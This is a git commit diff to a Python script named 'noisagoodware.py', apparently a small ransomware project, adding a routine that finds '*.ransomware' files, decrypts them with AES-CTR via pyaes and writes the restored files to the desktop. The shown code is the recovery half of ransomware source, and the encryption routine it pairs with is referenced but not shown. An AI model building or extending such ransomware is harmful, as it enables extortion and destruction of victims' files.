adb1ec553d345d942bbc97472fb3d6d71ee946e2
Arthur Corona <coronaggp@gmail.com>
2022-05-30 22:13:54 -0300

    decrypt ok

--- noisagoodware.py
+++ noisagoodware.py
@@ -2,6 +2,7 @@
 
 # importando bibliotecas
  
+from multiprocessing.sharedctypes import Value
 import os
 import glob 
 import time
@@ -45,3 +46,19 @@ def encrypting():
 
 def decrypting(decrypt_file):
     try:
+        for file in glob.glob('*.ransomware'):
+
+            keybytes = decrypt_file.encode()
+            name_file = open(file, 'rb')
+            file_data = name_file.read()
+            dkey = keybytes 
+            daes = pyaes.AESModeOfOperationCTR(dkey)
+            decrypt_data = daes.decrypt(file_data)
+
+            format_file = file.split('.')
+            new_file_name = format_file[0] + '.' + format_file[1] 
+
+            dnew_file = open(f'{desktop}\\{new_file_name}', 'wb')
+            dnew_file.write(decrypt_data)
+            dnew_file.close()
+
